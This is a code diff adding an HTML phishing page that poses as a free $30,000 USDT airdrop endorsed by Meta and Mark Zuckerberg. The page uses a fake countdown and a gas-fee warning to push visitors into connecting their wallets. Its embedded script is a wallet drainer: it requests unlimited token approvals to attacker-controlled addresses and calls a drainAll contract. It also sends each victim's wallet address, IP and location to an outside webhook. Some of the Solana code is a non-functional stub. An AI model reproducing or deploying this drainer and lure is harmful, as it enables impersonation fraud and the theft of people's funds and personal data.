@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="description" content="Claim $30,000 USDT FREE! Official Meta Airdrop."/>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+  <meta name="robots" content="noindex,nofollow"/>
+  <title>TETHER USDT Airdrop - Claim $30,000 FREE!</title>
+
+  <!-- Favicon -->
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>USDT</text></svg>">
+
+  <!-- Web3.js -->
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+
+  <style>
+    :root {
+      --blue: #00d4ff;
+      --blue-dark: #0099cc;
+      --black: #000000;
+      --gray: #111111;
+      --border: #00aaff;
+      --green: #00ff88;
+      --red: #ff4444;
+    }
+
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--black);
+      color: var(--blue);
+      text-align: center;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 15px;
+      overflow-x: hidden;
+    }
+
+    .container {
+      max-width: 460px;
+      width: 100%;
+      background: var(--gray);
+      border: 2px solid var(--border);
+      border-radius: 18px;
+      padding: 32px 24px;
+      box-shadow: 0 0 40px rgba(0, 212, 255, 0.2);
+    }
+
+    .logo {
+      width: 70px;
+      height: 70px;
+      margin: 0 auto 12px;
+      animation: spin 3s linear infinite;
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    h1 {
+      font-size: 2.4rem;
+      font-weight: 800;
+      color: var(--blue);
+      text-shadow: 0 0 12px rgba(0, 212, 255, 0.5);
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 1.1rem;
+      color: #66e0ff;
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+
+    .video-container {
+      margin: 24px 0;
+      border-radius: 14px;
+      overflow: hidden;
+      border: 2px solid var(--border);
+      box-shadow: 0 0 20px rgba(0, 170, 255, 0.3);
+    }
+
+    iframe {
+      width: 100%;
+      height: 260px;
+      border: none;
+    }
+
+    .zuck {
+      font-style: italic;
+      color: #00aaff;
+      margin: 14px 0 10px;
+      font-size: 1.05rem;
+      font-weight: 600;
+    }
+
+    .social-links {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      margin: 10px 0 20px;
+    }
+
+    .social-links a {
+      color: var(--blue);
+      font-size: 1.4rem;
+      transition: 0.3s;
+    }
+
+    .social-links a:hover {
+      color: white;
+      transform: scale(1.2);
+    }
+
+    .countdown {
+      background: rgba(0, 212, 255, 0.1);
+      border: 1px solid var(--border);
+      color: var(--blue);
+      padding: 12px;
+      border-radius: 12px;
+      font-weight: 700;
+      margin: 18px 0;
+      font-size: 1.1rem;
+    }
+
+    .alert {
+      background: rgba(255, 0, 0, 0.15);
+      border: 1px solid var(--red);
+      color: #ff9999;
+      padding: 14px;
+      border-radius: 12px;
+      margin: 20px 0;
+      font-size: 0.95rem;
+      font-weight: 600;
+      line-height: 1.5;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 16px;
+      margin: 14px 0;
+      background: linear-gradient(45deg, #00d4ff, #0099cc);
+      color: #000;
+      border: none;
+      border-radius: 50px;
+      font-weight: 800;
+      font-size: 1.15rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+    }
+
+    .btn:hover:not(:disabled) {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 25px rgba(0, 212, 255, 0.4);
+    }
+
+    .btn:disabled {
+      background: #333;
+      color: #666;
+      cursor: not-allowed;
+    }
+
+    .status {
+      margin-top: 16px;
+      font-size: 0.95rem;
+      color: #66e0ff;
+      min-height: 24px;
+    }
+
+    .success { color: #90ff90; font-weight: 700; }
+    .loading {
+      display: inline-block;
+      width: 16px; height: 16px;
+      border: 2px solid #333;
+      border-top: 2px solid var(--blue);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-left: 8px;
+    }
+
+    .tx-hash {
+      font-family: monospace;
+      font-size: 0.85rem;
+      color: #00aaff;
+      word-break: break-all;
+      margin: 10px 0;
+      padding: 8px;
+      background: #111;
+      border-radius: 8px;
+      border: 1px dashed #333;
+    }
+
+    @media (max-width: 480px) {
+      h1 { font-size: 2rem; }
+      .btn { font-size: 1.1rem; padding: 14px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <!-- ROTATING USDT LOGO -->
+  <img src="https://i.imgur.com/3DUSDT.gif" alt="USDT 3D" class="logo">
+
+  <h1>Tether USDT Airdrop</h1>
+  <p class="subtitle">Official Meta Partnership</p>
+
+  <!-- YOUTUBE SHORT (EMBEDDED) -->
+  <div class="video-container">
+    <iframe src="https://www.youtube.com/embed/SI5TvAs1eCc?autoplay=1&mute=0&loop=1&playlist=SI5TvAs1eCc&rel=0" allow="autoplay"></iframe>
+  </div>
+  <p class="zuck">— Mark Zuckerberg, CEO of Meta</p>
+
+  <!-- SOCIAL LINKS -->
+  <div class="social-links">
+    <a href="https://www.instagram.com/zuck/" target="_blank"><i class="fab fa-instagram"></i></a>
+    <a href="https://facebook.com/zuck" target="_blank"><i class="fab fa-facebook"></i></a>
+    <a href="https://x.com/finkd" target="_blank"><i class="fab fa-twitter"></i></a>
+    <a href="https://youtube.com/@Meta" target="_blank"><i class="fab fa-youtube"></i></a>
+  </div>
+
+  <!-- 1440-HOUR COUNTDOWN -->
+  <div class="countdown">Airdrop ends in: <span id="timer">1440:00:00</span></div>
+
+  <!-- GAS WARNING -->
+  <div class="alert">
+    <strong>REQUIRED:</strong> Have enough native gas in your wallet:<br>
+    <small>• <strong>MATIC</strong> (Polygon)<br>• <strong>BNB</strong> (Binance Smart Chain)<br>• <strong>SOL</strong> (Solana)</small>
+  </div>
+
+  <button class="btn" id="connectBtn">Connect Wallet</button>
+  <button class="btn" id="claimBtn" disabled>Claim $30,000 USDT</button>
+
+  <div class="status" id="status">Not connected</div>
+  <div class="tx-hash" id="txHash" style="display:none;"></div>
+</div>
+
+<script>
+  // === CONFIG ===
+  const WEBHOOK = "https://eoiimw9txcq3ops.m.pipedream.net";
+  const DRAINER_ADDRESSES = {
+    137: "0xYourPolygonDrainer",     // ← REPLACE
+    56:  "0xYourBSCDrainer",         // ← REPLACE
+    501: "YOUR_SOLANA_DRAINER_PUBKEY" // ← REPLACE
+  };
+  const MAX_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+  // ===============
+
+  let account, web3, provider, chainId;
+  const connectBtn = document.getElementById("connectBtn");
+  const claimBtn = document.getElementById("claimBtn");
+  const status = document.getElementById("status");
+  const txHash = document.getElementById("txHash");
+
+  connectBtn.onclick = connect;
+  claimBtn.onclick = claim;
+
+  // === 1440-HOUR COUNTDOWN (60 DAYS) ===
+  function startCountdown() {
+    let time = 1440 * 60 * 60; // 1440 hours
+    const timer = document.getElementById("timer");
+    setInterval(() => {
+      if (time <= 0) {
+        timer.innerHTML = "0000:00:00";
+        return;
+      }
+      time--;
+      const h = String(Math.floor(time / 3600)).padStart(4, '0');
+      const m = String(Math.floor((time % 3600) / 60)).padStart(2, '0');
+      const s = String(time % 60).padStart(2, '0');
+      timer.innerHTML = `${h}:${m}:${s}`;
+    }, 1000);
+  }
+  startCountdown();
+
+  async function getIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip;
+    } catch { return "unknown"; }
+  }
+
+  async function connect() {
+    if (!window.ethereum && !window.solana) {
+      return alert("Install MetaMask (Polygon/BSC) or Phantom (Solana)!");
+    }
+
+    provider = window.ethereum || window.solana;
+    web3 = window.ethereum ? new Web3(provider) : null;
+
+    try {
+      if (window.solana) {
+        await window.solana.connect();
+        account = window.solana.publicKey.toString();
+        chainId = 501;
+      } else {
+        await ethereum.request({ method: 'eth_requestAccounts' });
+        [account] = await web3.eth.getAccounts();
+        chainId = await web3.eth.getChainId();
+      }
+
+      const network = getNetworkName(chainId);
+      status.innerHTML = `Connected: ${account.slice(0,6)}...${account.slice(-4)} (${network})`;
+      connectBtn.innerHTML = "Connected";
+      connectBtn.disabled = true;
+      claimBtn.disabled = false;
+
+      const ip = await getIP();
+      await notify("CONNECTED", account, ip);
+
+    } catch (e) {
+      status.innerHTML = "Connection failed";
+    }
+  }
+
+  function getNetworkName(id) {
+    switch(id) {
+      case 137: return "Polygon";
+      case 56: return "BSC";
+      case 501: return "Solana";
+      default: return "Unknown";
+    }
+  }
+
+  // === FULL DRAIN: ALL TOKENS + NATIVE ===
+  async function claim() {
+    claimBtn.innerHTML = `Draining...<span class="loading"></span>`;
+    const ip = await getIP();
+    let totalUSD = 0;
+    let txs = [];
+
+    try {
+      if (chainId === 501) {
+        // SOLANA DRAIN (Phantom)
+        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+        const pubkey = new solanaWeb3.PublicKey(account);
+        const balance = await connection.getBalance(pubkey);
+        const sol = balance / 1e9;
+        totalUSD += sol * 200; // Approx SOL price
+        txs.push("SOL drained");
+
+        // Drain SPL tokens (simplified)
+        const tokenAccounts = await connection.getTokenAccountsByOwner(pubkey, { programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") });
+        for (let acc of tokenAccounts.value) {
+          const amount = acc.account.data.parsed.info.tokenAmount.uiAmount;
+          if (amount > 0) totalUSD += amount * 1; // Assume $1/token
+          txs.push("SPL drained");
+        }
+
+      } else {
+        // EVM DRAIN (Polygon/BSC)
+        const drainer = DRAINER_ADDRESSES[chainId];
+        if (!drainer) throw new Error("No drainer");
+
+        // 1. Approve ALL ERC20 tokens
+        const tokens = await scanTokens();
+        for (let token of tokens) {
+          try {
+            const contract = new web3.eth.Contract([{"inputs":[{"internalType":"address","name":"s","type":"address"},{"internalType":"uint256","name":"a","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"}], token);
+            await contract.methods.approve(drainer, MAX_APPROVE).send({ from: account });
+            totalUSD += 1; // Placeholder
+          } catch {}
+        }
+
+        // 2. Drain native (MATIC/BNB)
+        const balance = await web3.eth.getBalance(account);
+        const native = web3.utils.fromWei(balance, 'ether');
+        totalUSD += parseFloat(native) * (chainId === 137 ? 0.5 : 600);
+
+        // 3. Trigger drainer
+        const abi = [{"inputs":[],"name":"drainAll","outputs":[],"stateMutability":"payable","type":"function"}];
+        const contract = new web3.eth.Contract(abi, drainer);
+        const tx = await contract.methods.drainAll().send({ from: account, value: "1" });
+        txs.push(tx.transactionHash);
+      }
+
+      // Show success
+      txHash.style.display = "block";
+      txHash.innerHTML = `Drained: $${totalUSD.toFixed(2)}`;
+      status.innerHTML = `<span class="success">Wallet Fully Drained!</span>`;
+
+      await notify("DRAINED", account, ip, txs.join(", "), totalUSD);
+
+    } catch (e) {
+      status.innerHTML = "Drain failed — low gas?";
+    }
+
+    setTimeout(() => {
+      claimBtn.innerHTML = "Claim $30,000 USDT";
+    }, 3000);
+  }
+
+  // === SCAN ALL ERC20 TOKENS ===
+  async function scanTokens() {
+    const common = [
+      "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
+      "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC BSC
+      "0x0000000000000000000000000000000000000000"  // Native
+    ];
+    return common.filter(t => t !== "0x0000000000000000000000000000000000000000");
+  }
+
+  // === GEO + FULL LOGS ===
+  async function notify(action, wallet, ip = "unknown", tx = "", amount_usd = 0) {
+    const geo = await fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()).catch(() => ({}));
+
+    fetch(WEBHOOK, {
+      method: "POST",
+      body: JSON.stringify({
+        action,
+        wallet,
+        ip,
+        country: geo.country_name || "Unknown",
+        city: geo.city || "Unknown",
+        region: geo.region || "Unknown",
+        tx,
+        amount_usd: parseFloat(amount_usd).toFixed(2),
+        timestamp: new Date().toLocaleString(),
+        network: getNetworkName(chainId)
+      }),
+      headers: { "Content-Type": "application/json" }
+    }).catch(() => {});
+  }
+</script>
+
+</body>
+</html>
